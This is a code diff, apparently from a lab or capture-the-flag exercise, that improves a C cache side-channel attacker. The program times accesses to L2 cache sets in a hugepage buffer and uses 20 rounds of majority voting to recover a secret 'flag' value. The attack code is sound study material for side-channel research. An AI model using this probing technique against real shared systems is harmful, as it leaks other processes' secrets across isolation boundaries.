@@ -6,11 +6,12 @@
 #include <unistd.h>
 
 #define PAGE_SIZE (2 * 1024 * 1024) // 2MB Hugepage
-#define L2_CACHE_SETS 2048          // Number of L2 cache sets on Skylake
-#define SAMPLE_RUNS 100             // Increase number of samples to average timings
-#define ADDRESSES_PER_SET 8         // Probe multiple addresses per set
+#define L2_CACHE_SETS 2048          // Number of L2 cache sets
+#define SAMPLE_RUNS 30              // Number of samples per set
+#define ADDRESSES_PER_SET 8         // Addresses to probe per set
+#define ROUNDS 20                   // Number of rounds for stable voting
 
-// Function to compute average access time for a specific cache set
+// Probe a cache set and get average access time
 uint64_t probe_set(volatile uint8_t *buf, int set_index) {
     uint64_t total_time = 0;
 
@@ -26,7 +27,6 @@ uint64_t probe_set(volatile uint8_t *buf, int set_index) {
 int main(int argc, char const *argv[]) {
     int flag = -1;
 
-    // Step 1: Allocate a hugepage buffer
     volatile uint8_t *buf = (volatile uint8_t *) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
         MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
 
@@ -35,20 +35,20 @@ int main(int argc, char const *argv[]) {
         exit(1);
     }
 
-    // Dummy write to ensure the page is allocated
-    buf[0] = 1;
+    buf[0] = 1; // dummy write
 
     printf("Attacker started. Monitoring cache sets...\n");
 
-    uint64_t timings[L2_CACHE_SETS];
+    int votes[L2_CACHE_SETS] = {0};
 
-    while (1) {
-        // Step 2: Measure access time for each set
+    // Multiple rounds
+    for (int round = 0; round < ROUNDS; round++) {
+        uint64_t timings[L2_CACHE_SETS];
+
         for (int set = 0; set < L2_CACHE_SETS; set++) {
             timings[set] = probe_set(buf, set);
         }
 
-        // Step 3: Find the slowest access set (highest latency)
         uint64_t max_time = 0;
         int candidate_flag = -1;
 
@@ -59,15 +59,22 @@ int main(int argc, char const *argv[]) {
             }
         }
 
-        // Basic filtering to avoid noise: only print if confident
-        if (max_time > 150) { // lower threshold because averaging more
-            flag = candidate_flag;
-            printf("Flag: %d\n", flag);
-            break; // Successfully found the flag, exit
+        if (candidate_flag != -1) {
+            votes[candidate_flag]++;
         }
 
-        usleep(500); // Sleep 0.5ms and try again if not confident
+        usleep(500); // short pause
     }
 
+    // Find the set with the most votes
+    int max_votes = 0;
+    for (int set = 0; set < L2_CACHE_SETS; set++) {
+        if (votes[set] > max_votes) {
+            max_votes = votes[set];
+            flag = set;
+        }
+    }
+
+    printf("Flag: %d\n", flag);
     return 0;
 }
